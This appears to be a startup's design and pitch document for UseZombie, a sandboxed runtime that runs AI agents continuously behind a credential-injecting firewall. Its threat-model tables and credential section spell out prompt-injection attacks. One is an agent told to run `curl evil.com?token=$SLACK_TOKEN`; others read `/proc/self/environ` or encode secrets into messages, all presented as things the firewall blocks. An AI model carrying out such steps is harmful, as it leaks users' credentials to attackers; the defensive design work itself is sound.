# UseZombie v2

**Run your agents 24/7. We handle the credentials, webhooks, and walls.**

**One sentence:** UseZombie runs your AI agent 24/7 without giving it your passwords.

**Positioning:** Heroku for agents, but the agent never sees your keys.

---

## The Problem You Have Today

You built an agent. It replies to leads, triages Slack messages, handles support tickets, opens PRs — whatever. It works when you run it on your laptop. Then you try to make it run continuously:

- You paste your GitHub token / Slack token / API key into an env var.
- You wrap it in a Docker container and run it on a VPS.
- You hack together a webhook receiver with ngrok.
- You realize the agent can see your tokens in plain text.
- You realize if the agent gets prompt-injected via a malicious message, it can exfiltrate those tokens.
- You realize you have no log of what the agent actually did at 3am.
- You realize you have no way to stop it mid-action.
- You realize you've built half of Heroku but worse.

This is the gap. There are great tools for building agents (Claude, GPT, LangChain). There are great tools for sandboxing code execution (E2B, Vercel Sandbox). But there is nothing purpose-built for **running your agent continuously, with webhooks wired up, credentials hidden from the agent, and a log of everything it does**.

That's UseZombie.

---

## The Flat Tire Test

A flat tire problem is one where the user stops what they're doing and pays to fix it *today*. Not "nice to have." Not "we should look into that." The tire is flat. You can't drive.

Three flat tires we're targeting:

### 1. "My agent burned $400 at 3am and I didn't know until the invoice"

Every agent hosting today (Docker, Railway, Fly) lets agents run unbounded. No spend ceiling, no kill-on-budget, no alert. This happens once and the user never trusts unsupervised agents again — unless someone gives them a hard ceiling with a kill switch.

**UseZombie answer:** Per-run token budgets, wall time limits, and a kill switch. One bad prompt never becomes an infinite burn. You set the ceiling before the agent runs.

### 2. "My agent did something at 3am and I can't explain what or why"

This isn't observability as a feature — it's observability as *liability cover*. When your agent opens a PR, replies to a customer, or posts in Slack, someone will ask "why did it do that?" If you can't answer, you pull the plug on all agents.

**UseZombie answer:** Every request, webhook, credential use, and decision is timestamped and replayable. Full audit trail. You can explain exactly what happened, to your manager, your customer, or your auditor.

### 3. "I want to let my agent do more, but I can't trust it with unsupervised access"

Today you either give an agent full access (all your tokens, all your repos, all your APIs) or no access. There's no middle ground. So operators keep agents on a short leash — supervised, limited, manual. The agent is capable of more, but trust is the bottleneck.

**UseZombie answer:** Scoped credential injection. The agent declares which services it needs. UseZombie injects credentials per-request at the firewall — the agent never sees a token. Network deny-by-default blocks everything else. You trust the boundary, not the agent.

---

## Competitive Landscape (April 2026)

**Nobody does all three today** — credential isolation + always-on webhook routing + operator control.

| Product | Credential isolation | Always-on / webhooks | Operator-controlled | What they actually are |
|---------|---------------------|---------------------|--------------------|-----------------------|
| **Composio** | **YES** (firewall injection, SOC 2) | Yes (triggers) | No (SaaS only) | Agent auth + tool integration layer. 1000+ app integrations. Closest to UseZombie's credential model but NOT a runtime — you still host your agent elsewhere. |
| **Cursor Automations** | No (user manages) | **YES** (Slack, Linear, GitHub, PagerDuty) | No (Cursor cloud) | IDE-native background agents. Launched March 2026. Triggers launch agents in Cursor cloud VMs. |
| **Devin** | No (sees all tokens) | Yes (Slack, Jira, Linear) | No ($500/mo SaaS) | Autonomous cloud coding agent. Valued at $10.2B. Acquired Windsurf. |
| **Factory AI** | No (env vars) | Yes (Slack, Linear, Sentry) | No (SaaS) | Autonomous coding droids. Multi-agent parallelism. SOC-2 Type II. |
| **LangGraph Platform** | No (bring your own) | Yes (durable state) | Yes (self-hostable) | Agent orchestration framework + cloud hosting. Most "runtime-like" option for DIY. |
| **Lindy AI** | No (user provides keys) | Yes (Zapier-like triggers) | No (SaaS) | No-code automation. 5000+ integrations. $49.99/mo. |
| **CrewAI** | No (env vars) | AMP provides hosting | Open-source framework | Multi-agent orchestration. AMP is the cloud hosting layer. |
| **E2B** | No (sandbox only) | No (ephemeral, max 24h) | No | Code execution sandbox (Firecracker VMs). Not a runtime. |
| **Relevance AI** | Partial (managed OAuth) | Yes (webhook triggers) | No | No-code agent builder focused on sales/GTM. Agent marketplace. |
| **CodeRabbit** | N/A (review only) | Yes (auto on PR) | No | AI code review. Not an agent runtime. |

**The gap:** A runtime that combines Composio's auth layer with LangGraph's durable execution and Cursor's webhook trigger model. That product does not exist. UseZombie builds it.

### Why not "just use Composio + LangGraph"?

You could duct-tape: LangGraph (runtime) + Composio (auth/tools) + your own webhook router. But that's three products, three bills, three failure modes, and you're still building the glue. UseZombie is the integrated stack — one install, one credential store, one audit trail.

---

## Zero-Trust AI Firewall

Reference: [Securing AI Agents with Zero Trust](https://www.youtube.com/watch/d8d9EZHU7fw)

Every agent runtime has attack surfaces: prompt injection, credential exfiltration, tool abuse, data poisoning, privilege escalation. UseZombie applies zero-trust principles at the runtime level:

### The firewall architecture

```
Agent process (sandboxed, bubblewrap + landlock)
    │
    │  Makes a normal HTTP request:
    │  POST https://slack.com/api/chat.postMessage
    │  Body: { channel: "#support", text: "..." }
    │  (no Authorization header — agent doesn't have one)
    │
    ▼
UseZombie AI Firewall
    │
    │  1. VERIFY: is this domain in the allow list?
    │  2. POLICY: is this agent authorized for chat.postMessage?
    │  3. INSPECT: does the request body contain prompt injection patterns?
    │  4. INJECT: add Authorization header (from encrypted vault, never in sandbox)
    │  5. LOG: agent_id, endpoint, method, timestamp, response_code
    │  6. FORWARD: send authenticated request to upstream
    │  7. STRIP: remove any token echo from response
    │  8. METER: count tokens, track cost, check budget
    │
    ▼
Slack API receives authenticated request
```

### What the firewall blocks

| Attack | What happens | UseZombie response |
|--------|-------------|-------------------|
| **Prompt injection** → agent told to `curl evil.com?token=$SLACK_TOKEN` | `$SLACK_TOKEN` doesn't exist in the sandbox. `evil.com` not in allow list. | **Blocked.** Logged as intrusion attempt. |
| **Credential exfiltration** → agent reads `/proc/self/environ` | Nothing there. No env vars with secrets. | **Blocked.** No credentials in sandbox memory or filesystem. |
| **Tool abuse** → agent calls `DELETE /api/users` instead of `POST /api/chat` | Policy check: agent only authorized for `chat.postMessage`. | **Blocked.** Logged as policy violation. |
| **Data exfil via allowed domain** → agent encodes secrets in Slack message body | Content inspection catches known patterns (base64 keys, token formats). | **Flagged.** Alert to operator. |
| **Hallucination cascade** → agent spawns sub-requests in a loop | Spend ceiling hit. Wall time exceeded. | **Killed.** Budget enforced. |
| **Lateral movement** → agent tries to reach internal services | Network deny-by-default. Only declared domains reachable. | **Blocked.** |

### Firewall metrics (operator dashboard)

```
┌────────────────────────────────────────────────┐
│  AI Firewall — Last 24h                        │
│                                                │
│  Requests proxied:        1,247                │
│  Credentials injected:      891                │
│  Prompt injections blocked:   3                │
│  Policy violations caught:    7                │
│  Hallucination kills:         1                │
│  Domains blocked:            14                │
│  Budget kills:                0                │
│                                                │
│  Trust score (7-day avg):   94/100             │
│  ──────────────────────────────────────────    │
│  Top blocked domains:                          │
│    evil.com (2)  pastebin.com (1)              │
│  Top policy violations:                        │
│    DELETE /api/* (4)  PUT /admin/* (3)          │
└────────────────────────────────────────────────┘
```

These metrics are the operator's answer to "how do I know my agents are behaving?" The trust score trends over time. If it drops, something changed — new prompt injection pattern, agent instructions drifted, or a new attack vector appeared.

### Zero-trust principles applied

| Zero-trust principle | UseZombie implementation |
|---------------------|------------------------|
| **Verify then trust** | Every outbound request verified against policy before forwarding |
| **Just-in-time, not just-in-case** | Credentials injected per-request, never stored in sandbox |
| **Least privilege** | Network deny-by-default. Agent declares what it needs, nothing more |
| **Assume breach** | Sandbox assumes agent is compromised. All security is outside the sandbox boundary |
| **Pervasive controls** | Firewall + sandbox + audit log + spend ceiling — defense in depth, not perimeter only |
| **Immutable audit trail** | Every action timestamped, append-only, operator-reviewable |
| **Kill switch** | Human in the loop. Stop any agent mid-action. |

---

## What UseZombie Is

A runtime for always-on agents.

You write your agent. You package it as a UseZombie skill (or install one from ClawHub). You tell UseZombie which services it needs (email, Slack, GitHub, Jira). UseZombie runs it in a sandboxed process with:

- **Webhooks wired** — your agent gets events from email, Slack, GitHub, etc. without you setting up ngrok or a custom server.
- **Credentials hidden** — your agent never sees a token. It makes normal HTTP requests. UseZombie's firewall layer intercepts outbound traffic, injects the right credential per-request, and strips it from the agent's view.
- **Walls up** — the agent can only reach the services you declared. Everything else is blocked.
- **AI firewall** — prompt injection detection, policy enforcement, content inspection, hallucination kill on every request.
- **Logs of everything** — every request the agent makes, every webhook it receives, every credential used, timestamped and replayable.
- **Spend ceiling** — per-run token budgets, wall time limits, kill-on-exceed. One bad prompt never becomes an infinite burn.
- **A kill switch** — stop any agent from the web UI or CLI, mid-action.
- **A chat panel** — talk to your running agent. "How many leads today?" / "Pause replies." / "Show me the last 5 actions."

---

## Skills Are Tools, Not Agents

Skills are capabilities the platform provides. An agent picks skills from this menu. The harness (runtime config) says which ones it's allowed to use.

```
Skills (tool adapters on ClawHub):
├── agentmail    — send/receive email via agentmail API
├── slack        — read/post messages, threads, reactions
├── github       — PRs, issues, reviews, comments, webhooks
├── git          — clone, branch, commit, push
├── linear       — create/update tickets
├── cloudflare   — tunnel status, DNS, zone health
├── pagerduty    — incidents, alerts, escalation
└── ...future    — jira, notion, discord, etc.
```

The agent's intelligence comes from its **instructions** (the LLM prompt in the skill spec). The skills just give it hands.

### Skill spec format (markdown with frontmatter)

```markdown
---
name: lead-collector
description: Reply to inbound signups with invite codes
version: 0.1.0
skills: [agentmail]
trigger:
  type: webhook
  source: agentmail
  event: message.received
credentials:
  agentmail:
    inject_for: [api.agentmail.to]
network:
  allow: [api.agentmail.to]
budget:
  max_tokens: 50000
  max_wall_time: 120s
---

## Instructions

You are a lead collector for {{workspace.name}}.

When an email arrives:
1. Parse the sender's email and name
2. Generate a unique invite code
3. Reply with the welcome template
4. Log the lead to the activity stream

## On error

If agentmail is unreachable, retry 3 times then log the failure.
Do not send duplicate replies — check the activity stream first.
```

The frontmatter is the machine-readable policy. The markdown body is the agent's instructions. One file. No separate YAML. Operators who use kogo.ai never see this file — it's generated from the UI. Developers who use UseZombie directly write it.

---

## Workspaces: Multi-Agent Workflows

A workspace is a **project** — a group of agents that share an activity stream and can be managed together. One workspace = one use case, multiple agents working together.

The workspaces below are **sample use cases, not the product boundary**. The platform doesn't care what the agent does — it cares that credentials are hidden, requests are inspected, actions are logged, and spend is capped. Any OpenClaw skill on ClawHub becomes a UseZombie skill with one addition: the trust layer (credential policy, network scope, spend ceiling, AI firewall). The skill registry already exists. The agent code already exists. UseZombie is the missing runtime.

### Trigger types

```
webhook:   — external event (agentmail, slack, github)
cron:      — scheduled (daily briefing, weekly report)
manual:    — operator runs it from CLI/UI
```

### Workspace 1: Lead Management

```
Workspace: "acme-leads"

Agent: lead-collector
  trigger: webhook (agentmail → message.received)
  skills: [agentmail]
  does: parse lead email → auto-reply with invite code → log

Agent: morning-briefing
  trigger: cron (8am daily)
  skills: [agentmail, slack]
  does: read yesterday's leads → slack #founders with summary
        "☀️ 3 new leads yesterday:
         - jane@acme.co (enterprise inquiry)
         - bob@startup.io (pricing question)
         - sarah@bigco.com (demo request)
         Highest priority: sarah@bigco.com (demo)"
```

**What connects them:** The activity stream. Agent 1 writes events (lead received, reply sent). Agent 2 reads them (summarize yesterday). They don't talk to each other — they share a workspace log.

### Workspace 2: PR Review Bot

```
Workspace: "acme-code-review"

Agent: pr-reviewer
  trigger: webhook (github → pull_request.opened)
  skills: [github, git, slack]
  does:
    → github webhook fires: new PR opened
    → clone repo, checkout PR branch
    → read diff, analyze for bugs/style/security
    → post review comment on the PR
    → if critical issues found:
        slack #engineering "⚠️ PR #142 has security issues, blocking merge"
    → if clean:
        approve PR, slack #engineering "✅ PR #142 looks good"

Agent: weekly-eng-digest
  trigger: cron (monday 9am)
  skills: [github, slack]
  does:
    → query: PRs merged last week, avg review time, who contributed
    → slack #engineering with weekly digest
```

### Workspace 3: Slack-to-PR (the killer use case)

```
Workspace: "acme-slack-fixes"

Agent: slack-fixer
  trigger: webhook (slack → message, filtered to #bugs channel)
  skills: [slack, git, github]
  does:
    → someone posts in #bugs: "the signup form 500s when email has a + in it"
    → agent reads the message
    → clones repo, searches for signup form code
    → finds the bug, writes a fix
    → runs make lint / make test / make build (self-repair if needed)
    → pushes branch, opens PR
    → replies in slack thread:
        "🧟 Found it. The email regex didn't handle +.
         Fix: PR #143 — tests added.
         github.com/acme/app/pull/143"
    → logs everything to activity stream

Agent: fix-tracker
  trigger: cron (end of day)
  skills: [slack, github]
  does:
    → how many bugs reported today?
    → how many PRs opened by slack-fixer?
    → how many merged vs closed?
    → slack #engineering with daily fix report
```

### Workspace 4: Infrastructure Health (Playbook Agents)

```
Workspace: "acme-infra-health"

Agent: tunnel-watchdog
  trigger: cron (every 5 minutes)
  skills: [cloudflare, slack]
  does:
    → check cloudflare tunnel status via API
    → if tunnel is down:
        slack #ops "🚨 Cloudflare tunnel prod-api is DOWN since 14:32"
        log incident to activity stream
    → if tunnel recovered:
        slack #ops "✅ Cloudflare tunnel prod-api recovered (downtime: 7m)"
    → daily summary at 6pm:
        "All tunnels healthy. Uptime: 99.97%. 1 incident today (7m)."

Agent: cert-watcher
  trigger: cron (daily 9am)
  skills: [cloudflare, slack]
  does:
    → check SSL cert expiry for all domains
    → if cert expires within 14 days:
        slack #ops "⚠️ SSL cert for api.acme.com expires in 12 days"
    → if cert expires within 3 days:
        slack #ops "🚨 SSL cert for api.acme.com expires in 2 days — renew NOW"

Agent: deploy-verifier
  trigger: webhook (github → deployment_status)
  skills: [github, cloudflare, slack]
  does:
    → new deployment completed
    → hit health endpoint, check response
    → check cloudflare tunnel is routing to new deployment
    → if healthy:
        slack #deploys "✅ Deploy v0.4.1 healthy. Tunnel routing confirmed."
    → if unhealthy:
        slack #deploys "🚨 Deploy v0.4.1 UNHEALTHY. Rolling back."
        → trigger rollback via github deployment API
```

### The pattern

Every workspace follows the same shape:

```
Workspace (one use case)
│
├── Event-driven agents (webhook triggers)
│   "something happened → do something about it"
│
├── Scheduled agents (cron triggers)
│   "check, summarize, report, follow up"
│
└── Activity stream (shared state)
    agents write events, other agents read them
```

---

## How This Maps to kogo.ai

kogo.ai is "AI that runs your business" — the operator-facing product. UseZombie is the infrastructure underneath it.

```
kogo.ai (operator interface)
  "I want an AI that handles my leads, reviews PRs, and briefs me every morning"
  │
  │  Operator configures workspaces, picks skills, sets budgets
  │  Never touches code. Never sees markdown. Just picks what agents do.
  │
  ▼
usezombie (runtime infrastructure)
  "I run those agents safely — credentials hidden, actions logged, spend capped"
  │
  │  Runs the sandboxes, injects credentials, routes webhooks,
  │  enforces budgets, AI firewall, logs everything, kill switch
  │
  ▼
clawhub (skill registry)
  "Here are the tools agents can use"
  agentmail, slack, github, git, cloudflare, linear, etc.
```

Two products, one stack:

| | kogo.ai | usezombie |
|---|---|---|
| **User** | Business operator, founder, team lead | Developer, platform engineer, agent builder |
| **Interface** | Web dashboard, natural language | CLI + API |
| **Pitch** | "AI that runs your business" | "Runtime that runs your agents safely" |
| **Value prop** | "Set up agents in 5 minutes, no code" | "Zero-trust agent runtime with credential firewall" |
| **Pricing** | Per-workspace, SaaS subscription | Per-run, infrastructure pricing |
| **Analogy** | Shopify (merchant dashboard) | Shopify backend (payments, inventory, shipping) |

kogo.ai users never touch UseZombie directly — they configure workspaces from a UI, and UseZombie runs them. UseZombie users are developers who want the runtime directly via CLI and API.

---

## How Credentials Work (The Core Technical Bet)

This is the thing that makes UseZombie different from "just run it in Docker."

Your agent never sees a credential. Ever.

```
Agent process (sandboxed, bubblewrap + landlock)
    │
    │  Makes a normal HTTP request:
    │  POST https://slack.com/api/chat.postMessage
    │  Body: { channel: "#support", text: "..." }
    │  (no Authorization header — agent doesn't have one)
    │
    ▼
UseZombie AI Firewall + Credential Proxy
    │
    │  1. Match domain: slack.com → credential exists
    │  2. Check policy: agent allowed to call chat.postMessage? ✓
    │  3. Inspect: prompt injection patterns? clean.
    │  4. Inject header: Authorization: Bearer xoxb-xxx
    │     (fetched from encrypted credential store, never written to
    │      the sandbox filesystem or env vars)
    │  5. Forward request
    │  6. Log: agent_id, endpoint, method, timestamp, response_code
    │  7. Return response to agent (stripped of any token echo)
    │  8. Meter: tokens used, cost tracked, budget checked
    │
    ▼
Slack API receives authenticated request
```

**What this prevents:**

- Agent gets prompt-injected → tries `curl evil.com?token=$SLACK_TOKEN` → `$SLACK_TOKEN` doesn't exist in the sandbox. And `evil.com` is not in the allow list. Blocked.
- Agent tries to read `/proc/self/environ` for secrets → nothing there.
- Agent tries to write credentials to a file and curl it out → no credentials in memory, and the outbound domain is blocked.
- Agent hallucinates and sends 1000 requests in a loop → spend ceiling hit, agent killed.

**How it's built:** The sandbox uses bubblewrap (user namespace isolation) + landlock (filesystem restriction). Outbound traffic routes through a proxy that handles credential injection, policy enforcement, and content inspection. The proxy runs outside the sandbox boundary. The agent process cannot access the proxy's memory or credential store.

---

## Interfaces

### CLI (ships first)

```bash
zombiectl install <skill>         # install from clawhub
zombiectl config set <key> <val>  # configure
zombiectl up                      # start all agents
zombiectl status                  # what's running, last events, firewall stats
zombiectl logs <agent>            # full activity log
zombiectl chat <agent>            # talk to a running agent
zombiectl stop <agent>            # kill switch
zombiectl credentials add <name>  # add a credential to the store
zombiectl firewall                # show firewall metrics and blocked requests
```

### Web UI (ships with v1)

Dashboard showing your workspace: running agents, recent activity, chat panel, credential store management, webhook status, AI firewall metrics. Hosted at `app.usezombie.com` or self-hosted.

### API

Full REST API for programmatic control. Agent-to-agent orchestration. Upstream planners trigger runs via API, get scorecards and audit trails back.

---

## What This Is (And What It Isn't)

**What it is:** A zero-trust runtime for your always-on agents. You bring the agent. UseZombie runs it safely, wires up webhooks, hides credentials, inspects every request, logs everything, and gives you a chat panel and kill switch.

**What it isn't:**
- Not an agent framework (use Claude, GPT, LangChain — whatever you want).
- Not a sandbox-as-a-service (E2B does that — UseZombie is opinionated about credential isolation and always-on operation, not generic code execution).
- Not a SaaS tool with built-in AI (Instantly, Smartlead do that — UseZombie runs YOUR agent).
- Not a workflow orchestrator (Temporal, Inngest do that — UseZombie doesn't chain steps, it runs your agent process).
- Not Composio (they do auth well — UseZombie is the full runtime: auth + sandbox + firewall + webhooks + audit + kill switch).

**One sentence:** UseZombie runs your AI agent 24/7 without giving it your passwords.

---

## How UseZombie Makes Money

### Runs

A "run" is one agent action cycle: receive event → process → respond → log.

| Plan | Always-on agents | Runs/month | Price |
|------|-----------------|------------|-------|
| Free | 1 | 200 | $0 |
| Pro | 5 | 5,000 | $29/mo |
| Team | 20 | 50,000 | $99/mo |
| Scale | Unlimited | 500,000 | $299/mo |

Overage: $0.10 per 100 runs.

**Why this pricing works:** A lead collector handling 10 signups/day = ~300 runs/month. A Slack responder in an active channel = ~1,000 runs/month. A tunnel watchdog checking every 5 min = ~8,640 runs/month. A free user with one agent gets enough to validate. A paid user with 5 agents across email + Slack + GitHub is in the Pro or Team tier.

The credential firewall, AI firewall metrics, audit log, and chat panel are included in all tiers. They're not upsells — they're the product. Without them, you'd just use Docker.

### Later

- **ClawHub marketplace** — third-party skills, revenue share.
- **Compliance add-on** — extended retention, replay, SOC 2 audit trail. For enterprises.
- **Self-hosted license** — for teams that can't send traffic through hosted infra.
- **kogo.ai** — no-code operator layer on top of UseZombie runtime.

---

## Competitive Position

| If you need... | Use... | Not UseZombie because... |
|----------------|--------|------------------------|
| A sandbox for code execution | E2B, Vercel Sandbox | They're for running generated code, not always-on agents with webhooks and credential isolation. |
| A sales outreach tool with built-in AI | Instantly, Smartlead | They're SaaS products. You don't control the agent, model, or prompt. |
| An agent framework | LangChain, CrewAI | They help you build agents. UseZombie runs them. |
| A workflow orchestrator | Temporal, Inngest | They chain functions. UseZombie runs a long-lived agent process. |
| Generic hosting | Railway, Fly.io | They run containers. UseZombie adds credential isolation, AI firewall, webhooks, audit, and chat — the agent-specific stuff you'd have to build yourself. |
| Agent auth layer only | Composio | They do auth well. UseZombie is the full runtime — auth + sandbox + firewall + webhooks + audit + spend control. |
| Autonomous coding agent | Devin, Factory, Cursor | They're SaaS agents you rent. UseZombie runs YOUR agent with YOUR instructions. |

UseZombie sits between "I built an agent" and "it runs safely in production, always on."

---

## What Exists Today (v1)

- `zombied` — Zig daemon. Workspace runtime, process supervisor.
- `zombie-worker` + `zombie-executor` (nullclaw) — spins agent sandboxes using bubblewrap + landlock. Runs to completion, observed.
- `zombiectl` — JS/Bun CLI. Workspace control, run management, agent profiles.
- Sandbox: bubblewrap + landlock isolation.
- API: full OpenAPI spec with workspaces, runs, agents, harness, credentials, skill secrets, SSE streaming.
- GitHub App automation (PR creation, branch push, scorecard comment).
- Self-repair gate loop (`make lint` / `make test` / `make build` with agent self-fix).
- Agent profiles with trust levels, scoring, and self-tuning proposals.
- Keyset pagination, idempotency, optimistic concurrency.
- Domains: `usezombie.sh` (agent-facing), `.com` / `.ai` (human-facing).

### What carries over from v1

- Sandboxed execution (bubblewrap + landlock)
- Observability and audit logging
- CLI (`zombiectl`)
- Cost control (token budgets, wall time limits)
- Agent profiles and scoring
- Harness compile → activate lifecycle
- Skill secrets (encrypted, scoped per skill)
- SSE streaming for live events

### What needs building for v2

1. **AI Firewall + Credential proxy** — encrypted store outside sandbox, outbound request interception, per-request credential injection, prompt injection detection, policy enforcement, content inspection. This is the core differentiator.
2. **Webhook router** — receive webhooks from agentmail, Slack, GitHub, Cloudflare, etc. and route to the right agent process.
3. **Always-on mode** — process supervision so agents restart on crash, run continuously (not just to completion). Cron triggers for scheduled agents.
4. **Activity stream** — shared event log per workspace. Agents write events, other agents read them. The glue between event-driven and scheduled agents.
5. **Firewall metrics dashboard** — requests proxied, credentials injected, prompt injections blocked, policy violations, hallucination kills, trust score trending.
6. **Multi-agent workspaces** — multiple agents per workspace, each with its own harness (skills, credentials, network policy, trigger).
7. **Chat interface** — send messages to running agents, get responses.
8. **Web UI** — dashboard, activity stream, chat panel, credential management, firewall metrics.

### What gets deferred

- Multi-agent competition / scored selection
- Score-gated auto-merge
- Firecracker sandbox backend
- Marketplace / third-party skills
- Compliance / SOC 2 reporting
- Desktop / mobile apps
- kogo.ai no-code layer

---

## What Ships First

Two skills. CLI + web interface. That's it.

### Skill 1: Lead Collector

Your website has a contact form. Submissions go to your agentmail address. UseZombie receives the webhook, your agent parses the email, generates an invite code, and replies — all within minutes, 24/7.

```
Your website form
    → submits to you@agentmail.to
    → agentmail fires webhook to usezombie
    → AI firewall inspects webhook payload
    → your agent processes it:
        parse sender email
        generate invite code
        reply via agentmail (credential injected by firewall)
        log to activity stream
    → user gets reply with invite code
```

**Setup:**

```bash
zombiectl install lead-collector
zombiectl credentials add agentmail
zombiectl up
```

From the web UI, you see every signup, every reply sent, every code generated, and every firewall metric. You chat with the agent: "how many signups this week?"

### Skill 2: Slack Responder

Your team Slack gets questions in #support or #eng-help. Your agent reads new messages, classifies urgency, drafts a response or escalates to a human, and posts back.

```
Slack channel message
    → Slack webhook fires to usezombie
    → AI firewall inspects payload
    → your agent processes it:
        classify: question / bug report / request / noise
        if answerable → draft and post reply (credential injected)
        if urgent → tag @oncall in thread
        if noise → ignore
        log to activity stream
```

**Setup:**

```bash
zombiectl install slack-responder
zombiectl credentials add slack
zombiectl up
```

---

## The Go-To-Market

1. **Ship lead-collector and slack-responder as free ClawHub skills** that work with plain OpenClaw. Get adoption on the skill format.
2. **Show the "what happens when it goes wrong" story** — the $400 invoice, the 3am hallucination, the prompt injection. That's where UseZombie's trust layer sells itself.
3. **Slack-to-PR workspace (Workspace 3) is the hero demo** — every engineering team has a #bugs channel with stale bugs. An agent that goes from slack message → PR in minutes, with credential isolation, is the "shut up and take my money" moment.
4. **Infrastructure health (Workspace 4) is the expansion play** — once operators trust UseZombie for code, they trust it for infra monitoring. Same trust layer, different skills.
5. **kogo.ai is the no-code layer** — when UseZombie has enough workspaces and skills proven, kogo.ai wraps it in a UI for non-technical operators.
